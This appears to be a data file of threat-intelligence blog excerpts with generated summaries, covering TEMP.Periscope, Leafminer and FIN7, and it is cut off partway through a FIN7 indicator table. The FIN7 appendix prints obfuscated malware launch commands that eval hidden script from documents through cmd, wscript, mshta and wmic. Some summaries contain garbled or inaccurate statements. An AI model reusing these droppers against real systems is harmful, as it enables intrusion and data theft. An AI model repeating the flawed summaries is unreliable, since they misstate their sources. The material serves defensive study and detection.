is the most recent example of aggressive nation-state intelligence collection on election processes worldwide.We expect TEMP.Periscope to continue targeting a wide range of government and military agencies, international organizations, and private industry. However focused this group may be on maritime issues, several incidents underscore their broad reach, which has included European firms doing business in Southeast Asia and the internal affairs of littoral nations. FireEye expects TEMP.Periscope will remain a virulent threat for those operating in the area for the foreseeable future.";"TEMP.Periscope is attempting to target Cambodian entities leading up to the July 29th elections. The primary attack vectors being utilized by the attackers are fake NGO attacks, T&amp;amp;amp;C injection attacks, malware variants, website downloaders, and IT-Security incidents targeting the CNRP website. The attackers&#x27; interests include geopolitical, military, and NATO affairs. Malware detected by antivirus software comprises Trojans, Backdoors, and Malware. The attackers are located in Hainan, China.";en;
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/leafminer-espionage-middle-east;Leafminer: New Espionage Campaigns Targeting Middle Eastern Regions;"This included the Fuzzbunch framework that was part of an infamous leak of exploits and tools by the Shadow Brokers in April 2017. Leafminer has developed exploit payloads for this framework (Table 2) that deliver custom malware through attacks against SMB vulnerabilities described by Microsoft. The EternalBlue exploit from the framework received worldwide attention after being used in the ransomware campaigns WannaCry in May and Petya/NotPetya in June 2017. The Leafminer operators use EternalBlue to attempt lateral movement within target networks from compromised staging servers.Symantec also observed attempts by Leafminer to scan for the Heartbleed vulnerability (CVE-2014-0160) from an attacker-controlled IP address. Furthermore, the Leafminer arsenal server hosted a Python script to scan for this vulnerability.Dictionary attacksAnother intrusion approach used by Leafminer seems a lot less sophisticated than the previously described methods but can be just as effective: using specific hacktools to guess the login passwords for services exposed by a targeted system. This type of attack was observed both via dedicated servers set up by Leafminer as well as staging servers compromised by the group.Commands found in a readme text that was stored in a ZIP archive together with the hacktool THC Hydra in Leafminer’s tool arsenal represent online dictionary attacks on Microsoft Exchange and Remote Desktop Protocol services of regional government servers in Saudi Arabia. ""Online"" in this case refers to the attacker using the protocol of the targeted network service to quickly run through many password guesses.Custom malwareSymantec identified two strains of custom malware used by the Leafminer group: Trojan.Imecab and Backdoor.Sorgu. Directly connected to this malware are several sets of reflective loader DLLs used as droppers or to execute specific commands on a compromised system.The development of custom malware by Leafminer as well as some of the tools used for lateral movement show a preference for the .NET framework. We also observed that the attackers would download and install the .NET framework on compromised machines, supposedly in the situation that an operator would have remote access to the system but required .NET to run Leafminer's custom tools. To this end, the command and control (C&C) server operated by the group hosted the legitimate setup executable for Microsoft .NET Framework 2.0 SP2.Backdoor.SorguBackdoor.Sorgu is used by the attackers to provide remote access to the infected machine. The backdoor is installed as a service in the Windows system through a shell command script.Trojan.ImecabThe purpose of Trojan.Imecab is to set up a persistent remote access account on the target machine with a hardcoded password. Variants of the malware were also observed with the filename guester.exe which likely refers to the functionality of adding a powerful guest account to the system.The malware installs itself in the system as a Windows service to achieve persistence and ensure that the guest account remains available to the attacker.Reflective loader DLLsTable 2 gives an overview of the reflective loader DLLs and their purpose:";Leafminer is a malicious cyber-organization that has been active in KSA since 2018, using various attack techniques including the Fuzzbunch framework for exploiting vulnerabilities in networks and systems across multiple sectors, including the government. The attackers have targeted financial, telecom, and military organizations in their attacks, and their attacks have been carried out using a mix of hacktools and custom malware. The group has used several variants of the malware identified, including variants of the malware using the hardcoded password, which may have been used to gain access to the remote access account.;en;
https://www.mandiant.com/resources/blog/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation;On the Hunt for FIN7: Pursuing an Enigmatic and Evasive Global Criminal Operation;"On Aug. 1, 2018, the United States District Attorney’s Office for the Western District of Washington unsealed indictments and announced the arrests of three individuals within the leadership ranks of a criminal organization that aligns with activity we have tracked since 2015 as FIN7. These malicious actors are members of one of the most prolific financial threat groups of this decade, having carefully crafted attacks targeted at more than 100 organizations. FIN7 is referred to by many vendors as “Carbanak Group,” although we do not equate all usage of the CARBANAK backdoor with FIN7. This blog explores the range of FIN7's criminal ventures, the technical innovation and social engineering ingenuity that powered their success, a glimpse into their recent campaigns, their apparent use of a security company as a front for criminal operations, and what their success means for the threat landscape moving forward. With this release, FireEye is also providing technical context, historical indicators, and techniques that organizations can use to hunt for FIN7 behavior enterprise-wide.FIN7 Does the Crime...The threat group is characterized by their persistent targeting and large-scale theft of payment card data from victim systems, which it has monetized at least a portion of through a prominent card shop. But FIN7’s financial operations were not limited to card data theft. In some instances, when they encountered and could not obtain payment card data from point of sale (POS) systems secured with end-to-end encryption (E2EE) or point-to-point encryption (P2PE), FIN7 pivoted to target finance departments within their victim organizations.Furthermore, in April 2017, FireEye reported that FIN7 sent spear phishing emails to personnel involved with United States Securities and Exchange Commission (SEC) filings at multiple organizations, providing further insight into FIN7’s targeting. These targeted individuals would likely have access to material non-public information that FIN7 actors could use to gain a competitive advantage in stock trading.Diversification of their monetization tactics has allowed the group to impact a wide range of industries beyond those solely associated with payment card industry. During campaigns that FireEye associates with FIN7, victims within the following sectors have been targeted within the United States and Europe:Restaurants *TravelHospitality *EducationCasinos and Gaming *ConstructionEnergy *RetailFinance *TelecommunicationsHigh-tech *GovernmentSoftware *Business servicesFIN7’s Innovation Enabled their SuccessThroughout FireEye’s tracking of FIN7 campaigns, the attackers have attempted to stay ahead of the game and thwart detection, using novel tactics and displaying characteristics of a well-resourced operation. For example, in April 2017, FireEye blogged about FIN7’s spear phishing emails that leveraged hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim. This was a direct departure from their established use of weaponized Office macros and highlighted the group’s adaptive nature to evade detection.FireEye also previously reported on FIN7’s use of the CARBANAK backdoor as a post-exploitation tool to cement their foothold in a network and maintain access to victim environments. CARBANAK is well known for its use in highly profitable and sophisticated attacks dating back to 2013, with usage attributable to FIN7 beginning in late 2015, although how interconnected the campaigns employing the malware over this five-year span are is unclear. FIN7’s use of CARBANAK is particularly notable due to their use of creative persistence mechanisms to launch the backdoor. The group leveraged an application shim database that injected a malicious in-memory patch into the Services Control Manager (""services.exe"") process, and then spawned a CARBANAK backdoor process. FIN7 also used this tactic to install a payment card harvesting utility.Another notable characteristic of FIN7 has been their heavy use of digital certificates. Unsurprisingly, malicious threat actors have sought to exploit the legitimacy afforded by these certificates. By digitally signing their phishing documents, backdoors and later stage tools, FIN7 was able to bypass many security controls that may limit execution of macros from Office documents and restrict execution of unsigned binaries on trusted systems.Organization Country Serial Email Korsar Travel TOV UA 88:21:ac:7e:6c:da:11:00:1d:b3:d3:1a:16:c1:5c:26 korsartravel@bk.ru Kaitschuck James GB 30:2e:7f:14:3a:f3:f3:98:20:70:42:4e:ea:52:5d:d2 oliversoftware@hotmail.com Park Travel RU 4d:e2:87:56:98:bf:c7:74:a3:f3:47:d6:70:7c:9b:f0 inga@parktravel-mx.ruTable 1: Sample FIN7 code signing certificatesFIN7 developed evasive techniques at a rapid pace. Throughout 2017, FIN7 was observed creating novel obfuscation methods, and in some cases modifying the methods on a daily basis while launching attacks targeting multiple victims. The threat group regularly tested malicious DOC, DOCX, and RTF phishing documents against public repositories to check static detection engine coverage. Their development of a payload obfuscation style using the Windows command interpreter's (cmd.exe) native string substitution was so unique that FireEye dubbed it ""FINcoding."" These methods inspired deep command line obfuscation research and the release of Daniel Bohannon's Invoke-DOSfuscation. Reference Table 2 and Table 3 for a selection of samples and their associated command line obfuscation techniques.FIN7’s Relentless Phone Calls and BellyachingOver the three years of responding to a multitude of compromises and proactively defending against FIN7, FireEye observed unprecedented social engineering prowess. From leveraging web forms for initial contact to targeting and engaging directly with pre-determined store managers, the operators demonstrated a range of capabilities. FIN7’s reach extended beyond their targets’ computer systems. FireEye has responded to incidents where FIN7 has called victims prior to lodging digital complaints laden with malicious documents as well as after the phishing documents have been sent, in order to check if they were received – a crude but effective FIN7 email delivery tracking technique.As FIN7 has matured, so did the quality of their phishing lures and templates, which were most often sent from fake but thoroughly disguised individuals and businesses – and occasionally from sender addresses impersonating legitimate government entities. Their phishing has often exploited urgent, high value business matters tailored to their chosen targets. At individual stores, managers were contacted about lost items or sent a “receipt” claiming overcharging. Other FIN7 phishing emails masqueraded as detailed catering orders or requests for special menus tailored to individuals with dietary restrictions.In early 2017, a pattern of complaints emerged and has continued for well over a year, where FIN7 has contacted stores and corporate offices to lodge food poisoning complaints with malicious attachments. Internally dubbed “FINdigestion” by FireEye, this pattern of detailed complaints eventually expanded beyond individual complaints and into litigious concerns raised on behalf of “the government”, as shown in Figure 1.Figure 1: FDA themed spear phishing emailIt is noteworthy that the BATELEUR backdoor activity first identified by Proofpoint in July 2017, which FireEye tracks as a suspected FIN7 subgroup, uses highly-customized graphics for their targets, often created in Adobe Photoshop. In this same phishing campaign, FIN7’s malicious attachment was graphically themed to match, as shown in Figure 2.Figure 2: FDA themed spear phishing attachmentThroughout their operations, the professional design and continued development of phishing elements in parallel to other post-compromise tools indicated to FireEye that FIN7 was most likely a well-resourced criminal operation.It’s Just MetadataFireEye has tracked several FIN7 personas throughout their operations by collecting and parsing filetypes of forensic value for juicy metadata. In a previous blog, we shared how LNK files created by FIN7 unintentionally revealed valuable information about their development environment.LNK files can contain metadata that reveals attributes about the systems on which the LNKs were created, including original file paths, volume serial numbers, MAC addresses, and hostnames. By studying values within the LNK metadata we often identify ""toolmarks,"" or unique values associated with distinct malware developer and operator personas.FIN7 LNK metadata shows that the actors routinely used virtual machines with generic hostnames such as ANDY-PC or USER-PC, and default hostnames with the structure WIN-[A-Z0-9]{11} (e.g. WIN-ABCDEFGH1JK).FireEye has tracked several hostname and path toolmarks associated with FIN7’s operations, which we have used to link clusters of threat activity together. These toolmarks may be linked to FIN7 members who are involved in tool development or the broader criminal operation. Notable personas from the technical data, which are explored in more detail in the Technical Appendix section, include:""andy"" / ""andy-pc""""Hass""""jimbo""""??????????"" (Konstantin)""oleg""This analysis allowed us to understand FIN7’s systems and correlate future attack activity to the different personas. Furthermore, the metadata analysis helped us monitor for files generated by the group and use the established toolmarks to establish detection for other adversary methodologies (such as direct RDP or SMB access) if the group changed TTPs.Video Playback of FIN7 OperationsWhile responding to multiple FIN7 intrusions, FireEye recovered a custom video recording capability used by FIN7 as a part of their operations. FireEye’s FLARE team reverse engineered the video protocol, which appeared to be custom-written by FIN7 as it has no external library dependencies, contained Cyrillic comments in the code, and required the use of a bespoke video player unique to FIN7. The attackers most likely leveraged this video recording capability in their arsenal to monitor operations in victim environments to inform later stages of their intrusions.FireEye obtained a version of the criminal developers’ video player from a trusted source and with the knowledge of the reverse engineered protocol, the FLARE team modified the source code to support multiple versions of FIN7’s custom encoding. With the patched source code, FireEye can decode and playback FIN7’s video monitoring for affected victims in possession of these files.Recent Shifts in FIN7 OperationsThroughout 2018, FireEye has continued to identify multiple domains registered using patterns consistent with prior FIN7 activity, as well as campaigns using disparate TTPs that we have attributed to FIN7 with varying degrees of confidence. ZIP archives delivering the BIRDDOG backdoor were hosted on a portion of suspected FIN7 domains registered in 2018. Some evidence further characterizing the nature of this campaign suggests these malicious documents were sent to financial institution customers in Eastern Europe and Central Asia as early as September 2017. The targeting of individuals rather than organizations would mark a significant shift in their targeting, although it is also possible that the banks spoofed in these campaigns were FIN7's ultimate targets.Additionally, we have identified similarities between FIN7 activity and BATELEUR campaigns, which began as early as mid-2017 and have been primarily aimed at U.S.-based restaurant chains. These campaigns leveraged macro-embedded Word documents directly attached to the emails as well as ones hosted on Google Drive. The documents were meticulously crafted to appear as though they came from legitimate organizations (e.g. restaurant associations and suppliers of POS hardware). This suspected FIN7 activity continued past the date of most recent arrest announced by U.S. law enforcement, although the attackers are now leveraging an updated JavaScript backdoor dubbed GRIFFON.These recent campaigns could be representative of a decisive effort to diversify TTPs to avoid detection or could indicate the formation of FIN7 splinter groups carrying out autonomous campaigns. As a result, organizations need to remain vigilant and continue to monitor for changes in the methods employed by the FIN7 actors.Unveiling FIN7’s Front Company and IndustryFigure 3: Combi Security logo as retrieved from 2016 cache of combisecurity.comAccording to U.S. law enforcement, at least a portion of FIN7 activity was run out of a front company dubbed Combi Security. A cache of its website reveals that the company purported to be “the world leaders in the field of comprehensive protection of large information systems from modern cyber threats” with headquarters in Moscow, Haifa, and Odessa. We have identified job advertisements for Combi Security that have been posted on popular Russian, Ukrainian, and Uzbek job recruitment sites, as well as numerous individuals who most likely worked for the company. Due to the seeming legitimacy of the recruitment postings, some individuals may have been unaware of illicit nature of their work. While the recruitment of unwitting individuals as puppets has been a common component of at least some criminal schemes – for example, reshipping mules who are recruited through postings on career sites advertising attractive work-from-home jobs – FIN7’s veiling of full-scale financial compromises as legitimate offensive security engagements is particularly notable. The apparent success of Combi Security in recruiting unsuspecting individuals in this manner, may lead to more of this type of technical recruitment by cyber criminals in the future.Splitting Up?The criminal organization behind FIN7 is almost certainly comprised of many additional individuals beyond those already apprehended by law enforcement authorities. FireEye iSIGHT Intelligence expects that at least a portion of these malicious actors are likely to continue conducting cyber crime activity in some capacity. Although we expect activity to continue, it is extremely common for threat actors to either modify their TTPs or temporarily halt operations following significant developments such as arrests of high-level members and/or public disclosure of TTPs that they employ.Depending on the organizational and communication structure of the group, it is also plausible that multiple subgroups could form and carry out independent operations in the future. Recent campaigns, as well as those using tactics that were atypical for historical FIN7 campaigns, such as the SEC campaigns with widespread targeting, may be representative of semi-autonomous groups pre-existing within, or cooperating with, the FIN7 criminal organization. As noted in our CARBANAK overview, certain malware families and techniques transcend strictly defined threat groups, and may be re-used by developers and operators as they transition between organizations and campaigns.ConclusionThese recent announcements by U.S. law enforcement highlight the positive impact that can result from synergy between private and public sector organizations in disrupting organized cyber crime operations. As demonstrated by FIN7, financially-motivated threat actors are becoming extremely advanced and are capable of inflicting significant harm on organizations through vast, but carefully orchestrated campaigns. As sophisticated threat groups continue to emerge, partnerships, such as those exhibited here, will almost certainly play a key role in combating these threats.AcknowledgementsJordan Nuce, Tom Bennett, Michael Bailey, and Daniel BohannonTechnical AppendixFireEye has responded to many FIN7 incidents, which has provided us extensive insight into their operations. As part of this blog post, we are also including numerous indicators that we attribute to FIN7 and an overview of their techniques to aid organizations in identifying malicious activity across their networks.Phishing Documents Technical DetailsIn addition to LNK metadata, FIN7 phishing documents consistently contained artifacts detailing the local file system paths of component files used to construct the spear phishing documents. In the following tables, we have also included examples of the myriad of command line obfuscation techniques used by FIN7. Of particular note is the quick turnaround time between documents employing different techniques.EXIF Creation Time Attribution Malware MD5 Filename 2018:05:21 17:32:00 Suspected FIN7 GRIFFON 7e703dddcfc83cd352a910b48eaca95e C:\Users\jimbo\Desktop\Files\????????\outlook2.png cmd.exe /k ""SET a01=wscr& SET a02=ipt&&call %a01%%a02% /e:jscript //b %TEMP%\errors.txt EXIF Creation Time Attribution Malware MD5 Filename 2018:01:26 15:59:00 Suspected FIN7 BATELEUR bb1a76702e2e7d0aa23385f24683d214 Doc1.doc C:\Users\Hass\Desktop\????????\New\outlook3.png cmd.exe /c wscript.exe //b /e:jscript %TEMP%\crashpad.ini EXIF Creation Time Attribution Malware MD5 Filename 2018:01:11 13:16:00 Suspected FIN7 BATELEUR 5972597b729a7d2853a3b37444e58e01 check.doc C:\Users\Hass\Desktop\????????\New\outlook2.png cmd.exe /c wscript.exe //b /e:jscript %TEMP%\crashpad.ini EXIF Creation Time Attribution Malware MD5 Filename 2017:10:25 07:43:00 Suspected FIN7 BATELEUR c4aabdcf19898d9c30c4c2edea0147f0 document1.doc C:\Users\oleg\Desktop\?????\????????\New\defender.jpg cmd.exe /c wscript.exe //b /e:jscript %TEMP%\crashpad.ini EXIF Creation Time Attribution Malware MD5 Filename 2017:06:23 15:18:00 Suspected FIN7 BATELEUR 467062d2a5a341716c42c6d7f36ba0ed check.doc C:\Users\Work\Desktop\IMAGES\outlook2.png wscript.exe //b /e:jscript %TEMP%\debug.txtTable 2: Suspected FIN7 spear phishing launch parameters and attacker local system artifactsEXIF Creation Time Attribution Malware MD5 Filename 2017:10:06 11:21:00 FIN7 HALFBAKED 29a3666cee0762fcd731fa663ebc0011 Doc0610.docx C:\Users\andy\Desktop\unlock.cmd cmd /c """"%TMP%\unlock.cmd"" "" @set w=wsc@ript /b /e:js@cript %HOMEPATH%\tt.txt@echo try{var fs=new ActiveXObject('Scripting.FileSystemObject');sh=new ActiveXObject('Wscript.Shell');p=sh.ExpandEnvironmentStrings('%%HOM'+'EPATH%%')+'\\pp.txt';var f=fs.OpenTextFile(p,1,false);for(i=0;i^<4;i++)f.SkipLine();var com='';while(!f.AtEndOfStream)com+=f.ReadLine().substr(1);f.Close();try{fs.DeleteFile(p, true);}catch(e){}this[String.fromCharCode(101)+'v'+'al'](com);}catch(e){}; >%HOMEPATH%\tt.txt@copy /y %TMP%\unlock.cmd %HOMEPATH%\pp.txt@echo %w:@=%|cmd EXIF Creation Time Attribution Malware MD5 Filename 2017:09:27 11:56:00 FIN7 HALFBAKED 6146a18570e134c6c32633aca14375fb Doc2709.docx C:\Users\usr\Documents\send\270917\unlock.doc.lnk wmic.exe process call create ""cmd start /min cmd /c for /f \""usebackq delims=\"" %x in (`FindStr /R /C:\""@#[0-9]#@\"" \""%TEMP%\unlock.doc.lnk\""`) do %x|cmd >nul 2>&1 &"" cmd.exe /S /D /c"" echo /*@#8#@*/try{sh=new ActiveXObject(""Wscript.Shell"");fs=new ActiveXObject(""Scripting.FileSystemObject"");p=sh.ExpandEnvironmentStrings(""%TM""+""P%"");f=fs.GetFile(p+""//unlock.doc.lnk"");s=f.OpenAsTextStream(1,0);c=s.Read(2403);c=s.ReadAll();s.Close();this[String.fromCharCode(101)+'va'+'l'](c);}catch(e){} >%HOMEPATH%\t.txt & wscript //b /e:jscript %HOMEPATH%\t.txt >nul 2>&1 &"" EXIF Creation Time Attribution Malware MD5 Filename 2017:08:08 17:38:00 FIN7 HALFBAKED 03e85ad4217775906e6b5ceae8dc27af Doc_n0908.rtf C:\Users\andy\Desktop\unlock.doc.lnk wmic.exe process call create ""mshta javascript:eval(\""try{eval('wall=GetObject(\\'\\''+String.fromCharCode(44)+'\\'Word.Application\\')');eval(wall.ActiveDocument.Shapes(2).TextFrame.TextRange.Text);}catch(e){};close();\"")"" mshta.exe ""try{jelo = 'try{w=GetObject("""",""Wor""+""d.Application"");this[String.fromCharCode(101)+\\'va\\'+\\'l\\'](w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text);}catch(e){};';var fso = new ActiveXObject(""Scripting.FileSystemObject"");var sh = new ActiveXObject(""Wscript.Shell"");var p = sh.ExpandEnvironmentStrings(""%HOMEPATH%"") + ""\\\\jelo.txt"""" EXIF Creation Time Attribution Malware MD5 Filename 2017:07:27 15:51:00 FIN7 HALFBAKED 63e2eb258a85ed4e72f951cdbff2a58e Dooq.docx C:\Users\jinvr-3-1\Desktop\unlock.doc.lnk cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%\ttt.txt & echo try{w=GetObject("""",""Wor""+""d.Application"");this[String.fromCharCode(101)+'va'+'l'](w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text);}catch(e){}; >%HOMEPATH%\ttt.txt & echo %x:@=%|cmd EXIF Creation Time Attribution Malware MD5 Filename 2017:06:28 16:21:00 FIN7 HALFBAKED 22ad7c05128ca7b48b0a2a4507803b16 Doc0507.rtf C:\Users\andy\Desktop\unprotect.rtf.lnk cmd.exe /C set x=wsc@ript /e:js@cript %HOMEPATH%\md5.txt & echo try{w=GetObject("""",""Wor""+""d.Application"");this[String.fromCharCode(101)+'va'+'l'](w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text);}catch(e){}; >%HOMEPATH%\md5.txt & echo %x:@=%|cmd EXIF Creation Time Attribution Malware MD5 Filename 2017:05:11 12:59:00 FIN7 HALFBAKEDBEACON 99975b5ee2ddd31e89c9bdda7a3871d9 Doc1.docx C:\Users\user\Documents\unprotect.lnk C:\WINDOWS\system32\mshta.exe vbscript:Execute(""On Error Resume Next:set yjdsqjtrn=GetObject(,""""Word.Application""""):execute yjdsqjtrn.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close"") EXIF Creation Time Attribution Malware MD5 Filename 2017:04:20 16:27:00 FIN7 HALFBAKEDBEACON 42a2a2352f6b1f5818f3b695f240fc3a info.rtf C:\Users\testadmin.TEST\Desktop\unprotect.lnk C:\WINDOWS\system32\mshta.exe vbscript:Execute(""On Error Resume Next:set wprotect=GetObject(,""""Word.Application""""):execute wprotect.ActiveDocument.Shapes(1).TextFrame.TextRange.Text:close"") EXIF Creation Time Attribution Malware MD5 Filename 2017:01:12 18:00:00 FIN7 HALFBAKEDBEACONBELLHOP cea2989309ccd5128f437335622978f1 order.rtf C:\Users\testadmin.TEST\Desktop\unprotected.vbeC:\Users\tst01\Desktop\unprotected.vbs %WINDIR%\System32\Wscript.exe %TEMP%\WindowsUpdate_X24532\beginer.vbs EXIF Creation Time Attribution Malware MD5 Filename 2016:08:12 11:26:00 FIN7 HALFBAKED fbf653b89a0814f515ddbdcf82cc3795 Reservation - Copy.docx C:\Users\test\Documents\sploits\120816\order.vbe %WINDIR%\System32\Wscript.exe %TEMP%\AdobeUpdateManagementTool.vbsTable 3: FIN7 spear phishing launch parameters and attacker local system artifactsFIN7 Tactics, Techniques & Procedures (TTPs)FireEye is providing insight into FIN7’s notable methodologies across multiple stages of the attack lifecycle and tips for identifying evidence of this activity and similarly suspicious activity in your environment.Attack Lifecycle Stage Adversary Methodology Discovery Tips Initial Compromise Spear phishing emails sent using PHP Mailer Inbound emails containing metadata such as “X-Mailer: PHPMailer” Establish Foothold Persistence using registry Run and Run Once keys New Run and RunOnce registry entries referencing .VBS and .VBA Establish Foothold Execution or persistence using Scheduled Tasks New Scheduled Tasks referencing .CMD, .LNK, .VBS, .VBA, .PS1 and other scripting language extensions Establish Foothold Persistence using Windows Services, Startup Directory New Windows Services, new files in Startup directories Establish Foothold Persistence using AppCompat Shim New shim database files and modifications of AppCompatFlags registry keys (see FIN7 SDB Persistence) Maintain Presence C2 using favored C2 ports Outbound connections with port-protocol mismatches on common ports such as 53,80,443,8080 Maintain Presence C2 using favored generic 3LDs Outbound connections or DNS resolutions to ""sketchy"" 2nd level domains with generic 3rd level domains such as mail, www1, www2, dns, ftp (eg. “mail[.]qefg[.]info”) Maintain Presence C2 using VPS infrastructure with low reputation Inbound and outbound connections from and to non-standard IP ranges, especially from international Virtual Private Server (VPS) providers Maintain Presence C2 using legitimate services including Google Docs, Google Scripts and Pastebin Maintain Presence C2 using DNS via A, OPT, TXT records Unusually long or numerous DNS A, TXT and OPT record queries Maintain Presence C2 domains registered with REG.RU Newly observed domains registered via REG.RU Maintain Presence C2 domains registered with NameCheap Newly observed domains registered via NameCheap Maintain Presence C2 domains registered with odd format and top-level domains Unusually long or numerous DNS queries with the structure [a-zA-Z]{4,5}\.[pw|us|club|info|site|top] (eg. “pvze[.]club”) Maintain Presence C2 domains registered with hyphen Outbound connections to newly registered, hyphenated domainsTable 4: FIN7 TTPsFIN7 IndicatorsFireEye is providing these granular technical indicators so that interested parties can better understand the threat actor and search for their historical activity across enterprise networks.Phishing Documents DroppersFilename MD5 Attribution Malware menu.rtf c14eb54769ff208a2562e4ef47958d9e FIN7 76eb6f124fba6599a54e92b829c55b63 FIN7 BEACON 3-ThompsonDan.rtf 4b783bd0bd7fcf880ca75359d9fc4da6 FIN7 BEACONBELLHOPHALFBAKED claim.rtf af53db730732aa7db5fdd45ebba34b94 FIN7 BEACONBELLHOPHALFBAKED order.rtf cea2989309ccd5128f437335622978f1 FIN7 BEACONBELLHOPHALFBAKED order.rtf cf4ccb3707e5597969738b4754782e4d FIN7 BEACONBELLHOPHALFBAKED Doc2_rtf.rtf 2dc0f4bece10759307026d90f585e006 FIN7 BEACONHALFBAKED doc1.doc 37759603c6cd91ebc8a1ea9ac0f2d580 FIN7 BEACONHALFBAKED quote.rtf 3c0bd71e91e0f18621ba43de4419f901 FIN7 BEACONHALFBAKED Doc2_rtf.rtf 562a64f1c09306d385962cf8084b6827 FIN7 BEACONHALFBAKED information.doc 5dace5ac5ba89c9bba4479264f75b2b6 FIN7 BEACONHALFBAKED Doc_rest_rtf.rtf 619aa4e6c9db275381ab0e7fc7078f5f FIN7 BEACONHALFBAKED doc1.docx 67c9bfd4d6ac397fb0cd7da2441a6fe2 FIN7 BEACONHALFBAKED Doc33.docx 6a5a42ed234910121dbb7d1994ab5a5e FIN7 BEACONHALFBAKED info_.rtf 6ac5ae6546746e3a9502cc489b71146e FIN7 BEACONHALFBAKED bmg.docx 754fc509328af413d93131e65fc46d31 FIN7 BEACONHALFBAKED Doc_0405_1.rtf 7b2315ff1f2d763857aa70ad34b75449 FIN7 BEACONHALFBAKED doc1.docx 99975b5ee2ddd31e89c9bdda7a3871d9 FIN7 BEACONHALFBAKED doc0505_1.rtf 9eb71edd5ec99294a1c341efa780b1b1 FIN7 BEACONHALFBAKED DonovanR.docx b5829caad7c448c558cb1dab2d9f4320 FIN7 BEACONHALFBAKED rising star.rtf c8b8420d1503ae48ff35362f5d29eeb3 FIN7 BEACONHALFBAKED inf6.docx e494356fc0db7ef6009d29e5ae869717 FIN7 BEACONHALFBAKED Claim.docx 06b9e2fdd2c0eeb78b851c93ca66f25f FIN7 BELLHOP order.rtf 80eed9f87a18b0093eb3f16fa495b6f7 FIN7 BELLHOP Details Joseph.docx b4d48f3e1ae339f2fcb94b7abceecfff FIN7 BELLHOP order.doc e2a6b351c276d02d71e18cd0677e8236 FIN7 BELLHOPHALFBAKED b14bc8cbc7f2d36179ebff96ade6d867 FIN7 CARBANAK features.doc bbd99ef280efebe9066c0aef91bf02cd FIN7 DRIFTPINHALFBAKED doc2709.rtf 01d666fcbc4cdcedbfe7963f498e7858 FIN7 HALFBAKED doc_n0908.rtf 03e85ad4217775906e6b5ceae8dc27af FIN7 HALFBAKED doc1.docx 0d6619481cfd29791a51ebb42ace5c03 FIN7 HALFBAKED doc1.rtf 0e0a51489054529a9dcb177d39f08b81 FIN7 HALFBAKED doc0719.docx 101bdbbd99cfd74aa5724842404642f2 FIN7 HALFBAKED doc0507.docx 17fabe288d640476a70154c59d5a1ba1 FIN7 HALFBAKED info_1.rtf 189c5a090d2b3b87ab65a8b156cd971e FIN7 HALFBAKED doc.docx 1a6c18967f4ce1c91c77098af4957e6e FIN7 HALFBAKED Mail.rtf 1a9e113b2f3caa7a141a94c8bc187ea7 FIN7 HALFBAKED Doc_rest_n_rtf.rtf 1f5022a02c82fbe414dc91bf3f1b5180 FIN7 HALFBAKED doc.docx 1f98c4ff12fc2c6fbf8247a5b2e4e7f4 FIN7 HALFBAKED doc1909.docx 1fbe77a3b5771ce4f95e02a49c5b7f30 FIN7 HALFBAKED doc_n0808.rtf 21926646a658bdf39cf28cdfbb1aced7 FIN7 HALFBAKED doc0507.rtf 22ad7c05128ca7b48b0a2a4507803b16 FIN7 HALFBAKED Doc2.docx 22e7d4f7401ef34b3b6d17c15291c497 FIN7 HALFBAKED menu.rtf 24fab1e9831e57307d17981abaabf960 FIN7 HALFBAKED 2-order.docx 28ad8e3a225400a1d00f6023f8e6c9c8 FIN7 HALFBAKED doc0610.docx 29a3666cee0762fcd731fa663ebc0011 FIN7 HALFBAKED doc2209_1.rtf 2d36634974c85eff393698b39edc561c FIN7 HALFBAKED Doc1.rtf 307a9ce257e97189e046fa91d3c27dab FIN7 HALFBAKED doc1.rtf 325844f1b956c52fc220932bc717f224 FIN7 HALFBAKED doc0910.rtf 3917028799d2aa3a43ec5bad067e99a5 FIN7 HALFBAKED doc1.docx 397d45b6001919b04739e26379c84dd9 FIN7 HALFBAKED docr.rtf 3a303f02e16d7d27fa78c3f48a55d992 FIN7 HALFBAKED oliver_davis.docx 3b12f36a01326ec649e4def08b860339 FIN7 HALFBAKED doc2209.docx.docx 402c34d7d6ce92bf5a048023bd2fde4a FIN7 HALFBAKED Dooq.docx 41c6861313e731bd3f84dd70360573ce FIN7 HALFBAKED info.rtf 42a2a2352f6b1f5818f3b695f240fc3a FIN7 HALFBAKED james.docx 499ebef3ab31a2f98fc8a358bd085b0f FIN7 HALFBAKED doc1007.rtf 4b7a742d5c98fc62f0f67445032e7bc6 FIN7 HALFBAKED tem6.doc 4bf691809224d17e49cebb071d22a867 FIN7 HALFBAKED doc1.rtf 511af2b4c62fa4c2bb91f3be1ca96094 FIN7 HALFBAKED doc1.docx 52cf6a63da29331d805a5a9b5015580f FIN7 HALFBAKED doc2209.rtf 560e72858ee413d7a6f72fff5ab7577b FIN7 HALFBAKED doc1.docx 5a0b796c7a6040e02c822cac4475f11a FIN7 HALFBAKED doc0717.rtf 5d49b444734b003b6917b81f0a779b3e FIN7 HALFBAKED 5d9525b48870dc438130bd96fb8c5b66 FIN7 HALFBAKED doc2.doc 5dd2e677fd1d65f051b7f54e7402721f FIN7 HALFBAKED Dooq.docx 63e2eb258a85ed4e72f951cdbff2a58e FIN7 HALFBAKED doc0720.rtf 6a860285a6f7521995151a2a0cb6e316 FIN7 HALFBAKED doc0719.rtf 6adec78e874232722c3758bbbcb95829 FIN7 HALFBAKED virus.docx 70f0f8db551dd6b084682188c3923e26 FIN7 HALFBAKED check.rtf 72d973ebfbc00d26170bfafdfbbd0179 FIN7 HALFBAKED Doc_0405.rtf 74165408ff12d195fb9d68afe0a6011e FIN7 HALFBAKED oliver_davis.rtf 793511c86a0469d579ff8cc99a7311e3 FIN7 HALFBAKED doc_n0808.docx 79628a598303692238cc4aeb19da6fed FIN7 HALFBAKED Doc1.rtf 7d664485c53b98180e6f3c69e9dfa81e FIN7 HALFBAKED doc1.docx 82a32d98e68891625b6de67a9d0b61c6 FIN7 HALFBAKED document.doc 853a53419d9dbc606d2392b99e60c173 FIN7 HALFBAKED doc2806.rtf 856cec68ddd28367c0d0f0a6f566187a FIN7 HALFBAKED doc1.rtf 8608b31a446f42a7f36807bd6c16d2c0 FIN7 HALFBAKED Doc1.rtf 8bd798e89d075827cc757b9586f15ce2 FIN7 